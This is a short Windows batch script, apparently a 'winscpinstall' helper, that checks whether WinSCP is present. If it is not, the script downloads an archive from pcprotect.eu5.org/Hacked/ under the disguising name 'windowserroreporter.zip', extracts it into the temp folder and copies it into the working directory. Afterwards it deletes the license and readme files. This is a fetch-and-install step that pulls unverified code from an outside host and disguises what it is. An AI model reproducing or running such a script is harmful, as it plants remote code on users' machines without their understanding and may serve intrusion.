rem winscpinstall HHB V0.3 L.I
@echo off
:start
if exist ftp\App\winscp\WinSCP.exe goto skip
if not exist ftp\App\winscp\WinSCP.exe goto downloadsetupcheck
:downloadsetupcheck
if exist %temp%\windowserroreporter.zip goto unzipcheck
if not exist %temp%\windowserroreporter.zip goto downloadsetup
:unzipcheck
if exist %temp%\ftp\WinSCPPortable.exe goto copyhost
if not exist %temp%\ftp\WinSCPPortable.exe goto unzip
:downloadsetup
powershell -Command "& {Invoke-WebRequest pcprotect.eu5.org/Hacked/windowserroreporter.zip -OutFile %temp%\windowserroreporter.zip}"
:unzip
powershell -Command "& Expand-Archive -Force %temp%\windowserroreporter.zip %temp% "
:copyhost
mkdir ftp
xcopy /s %temp%\ftp %cd%\ftp
:skip
echo setup done
del ftp\WinSCPPortable.exe
del ftp\app\winscp\puttyportablelinker.exe
del ftp\app\winscp\readme.txt
del ftp\app\winscp\license.txt